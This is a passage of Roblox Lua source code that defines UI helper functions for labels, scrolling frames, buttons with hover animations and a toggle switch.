end

-- mkLbl — primary label helper (never shadows itself)
local function mkLbl(parent, text, size, color, font, xa)
    local l = Instance.new("TextLabel")
    l.BackgroundTransparency = 1
    l.Text = text or ""
    l.TextSize = size or 13
    l.TextColor3 = color or T.TXT
    l.Font = font or Enum.Font.GothamBold
    l.TextXAlignment = xa or Enum.TextXAlignment.Left
    l.TextTruncate = Enum.TextTruncate.AtEnd
    l.Parent = parent
    return l
end

local function mkSF(parent, sz, pos)
    local s = Instance.new("ScrollingFrame")
    s.Size = sz or UDim2.new(1,0,1,0)
    if pos then s.Position = pos end
    s.BackgroundTransparency = 1
    s.BorderSizePixel = 0
    s.ScrollBarThickness = 5
    s.ScrollBarImageColor3 = T.SCR
    s.CanvasSize = UDim2.new(0,0,0,0)
    s.AutomaticCanvasSize = Enum.AutomaticSize.Y
    s.Parent = parent
    return s
end

-- mkBtn — button with safe hover tween (no Color3 arithmetic overflow)
local function mkBtn(parent, text, bgColor, fgColor, sz, pos)
    local b = Instance.new("TextButton")
    b.Size = sz or UDim2.new(0,100,0,30)
    if pos then b.Position = pos end
    b.BackgroundColor3 = bgColor or T.ACC
    b.TextColor3 = fgColor or T.TXT
    b.Font = Enum.Font.GothamBold
    b.TextSize = 12
    b.Text = text or ""
    b.AutoButtonColor = false
    b.BorderSizePixel = 0
    b.Parent = parent
    mkCorner(b, 6)
    local base = bgColor or T.ACC
    local hov = Color3.new(
        math.min(base.R * 1.25, 1),
        math.min(base.G * 1.25, 1),
        math.min(base.B * 1.25, 1)
    )
    local dim = Color3.new(base.R * 0.75, base.G * 0.75, base.B * 0.75)
    b.MouseEnter:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.1), {BackgroundColor3=hov}):Play()
    end)
    b.MouseLeave:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.1), {BackgroundColor3=base}):Play()
    end)
    b.MouseButton1Down:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.06), {BackgroundColor3=dim}):Play()
    end)
    b.MouseButton1Up:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.1), {BackgroundColor3=base}):Play()
    end)
    return b
end

-- mkToggle — toggle switch widget
local function mkToggle(parent, labelText, initState, onChange)
    local ctr = Instance.new("Frame")
    ctr.Size = UDim2.new(1,0,0,28)
    ctr.BackgroundTransparency = 1
    ctr.Parent = parent

    local lText = mkLbl(ctr, labelText, 12, T.TXT, Enum.Font.Gotham)
    lText.Size = UDim2.new(1,-56,1,0)

    local track = Instance.new("Frame")
    track.Size = UDim2.new(0,44,0,22)
    track.Position = UDim2.new(1,-44,0.5,-11)
    track.BackgroundColor3 = initState and T.ACC or T.BG3
    track.Parent = ctr
    mkCorner(track, 11)
    mkStroke(track, T.BDR)

    local knob = Instance.new("Frame")
    knob.Size = UDim2.new(0,16,0,16)
    knob.Position = initState and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8)
    knob.BackgroundColor3 = T.TXT
    knob.Parent = track
    mkCorner(knob, 8)

    local state = initState
    local hitbox = Instance.new("TextButton")
    hitbox.Size = UDim2.new(1,0,1,0)
    hitbox.BackgroundTransparency = 1
    hitbox.Text = ""
    hitbox.Parent = ctr
    hitbox.MouseButton1Click:Connect(function()
        state = not state
        TweenService:Create(track, TweenInfo.new(0.18), {BackgroundColor3=state and T.ACC or T.BG3}):Play()
        TweenService:Create(knob, TweenInfo.new(0.18), {Position=state and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8)}):Play()
        if onChange then onChange(state) end
    end)
    return ctr
end

